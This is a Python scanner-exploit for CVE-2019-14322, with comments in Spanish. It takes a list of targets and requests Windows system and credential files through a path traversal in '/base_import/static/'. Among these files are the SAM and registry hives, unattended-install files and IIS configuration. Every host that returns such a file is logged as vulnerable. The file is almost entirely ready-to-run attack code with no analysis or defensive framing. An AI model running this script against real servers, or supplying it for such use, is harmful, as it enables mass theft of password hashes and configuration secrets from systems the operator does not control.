import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Definir colores de consola
green = '\033[92m'
red = '\033[91m'
end = '\033[0m'

def check(url, wordlist=None):
    # Si se proporciona una wordlist, cargarla, de lo contrario usar la lista predefinida
    if wordlist:
        with open(wordlist, 'r') as f:
            sensitive_files = [line.strip() for line in f if line.strip()]
    else:
        # Lista de rutas sensibles a probar (por defecto)
        sensitive_files = [
            'c:/windows/win.ini'
            'c:/windows/repair/sam',
            'c:/windows/System32/config/RegBack/SAM',
            'c:/windows/repair/system',
            'c:/windows/repair/software',
            'c:/windows/repair/security',
            'c:/windows/debug/NetSetup.log',
            'c:/windows/system32/logfiles/httperr/httperr1.log',
            'c:/sysprep.inf',
            'c:/sysprep/sysprep.inf',
            'c:/sysprep/sysprep.xml',
            'c:/windows/Panther/Unattended.xml',
            'c:/inetpub/wwwroot/Web.config',
            'c:/windows/system32/config/AppEvent.Evt',
            'c:/windows/system32/config/SecEvent.Evt',
            'c:/windows/system32/config/default.sav',
            'c:/windows/system32/config/security.sav',
            'c:/windows/system32/config/software.sav',
            'c:/windows/system32/config/system.sav',
            'c:/windows/system32/inetsrv/config/applicationHost.config',
            'c:/windows/system32/inetsrv/config/schema/ASPNET_schema.xml',
            'c:/windows/System32/drivers/etc/hosts',
            'c:/windows/System32/drivers/etc/networks',
            'c:/windows/system32/config/SAM'
        ]

    # Iterar sobre cada archivo o directorio en la lista
    for file_path in sensitive_files:
        try:
            # Usamos la misma URL base pero variamos la ruta del archivo
            endpoint = f'http://{url}/base_import/static/{file_path}'
            resp = requests.get(endpoint, verify=False, timeout=5)

            # Verifica si el c√≥digo de estado es 200 (OK)
            if resp.status_code == 200:
                print(f"{green}[+] {endpoint} : vulnerable====[+]")
                with open('CVE-2019-14322_result.txt', 'a+') as output:
                    output.write(f'{endpoint}\n')

            else:
                print(f"{red}[-] {endpoint} : not vulnerable (Status Code: {resp.status_code}){end}")

        except KeyboardInterrupt:
            exit('User aborted!')
        except Exception as e:
            print(f"{red}[-] {url} : not vulnerable. Error: {str(e)}{end}")

def main(args):
    f = open(args.targetlist, "r")
    for w in f:
        url = w.strip()
        check(url, wordlist=args.wordlist)

if __name__ == '__main__':
    try:
        # Parseador de argumentos
        parser = argparse.ArgumentParser(description='CVE-2019-14322')
        parser.add_argument("-l", "--targetlist", required=True, help="target list in file")
        parser.add_argument("-w", "--wordlist", required=False, help="wordlist of directories/files to test")
        args = parser.parse_args()

        main(args)

    except KeyboardInterrupt:
        exit('User aborted!')
